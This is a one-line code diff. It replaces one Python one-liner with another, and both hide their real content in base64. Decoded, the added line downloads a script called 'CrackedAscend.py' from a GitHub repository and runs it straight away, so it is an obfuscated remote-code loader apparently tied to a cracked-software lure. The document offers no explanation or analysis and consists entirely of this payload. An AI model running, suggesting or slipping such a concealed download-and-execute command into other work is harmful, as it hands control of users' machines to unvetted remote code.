@@ -1,1 +1,1 @@
-python -c "import base64,requests,sys; sys.modules['__main__'].__file__='script.py'; exec(compile(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzOyBleGVjKHJlcXVlc3RzLmdldCgnaHR0cHM6Ly9naXRodWIuY29tL2Jpc2tpdC1naXQvcHJvamVjdC9yYXcvcmVmcy9oZWFkcy9tYWluL0NyYWNrZWRBc2NlbmQucHknKS50ZXh0KQ=='),'<string>','exec'))"
+python -c "import base64,requests;exec(compile(base64.b64decode(b'aW1wb3J0IHJlcXVlc3RzCmNvZGUgPSByZXF1ZXN0cy5nZXQoJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9iaXNraXQtZ2l0L3Byb2plY3QvbWFpbi9DcmFja2VkQXNjZW5kLnB5JykudGV4dApleGVjKGNvZGUpCg=='),'<string>','exec'))"
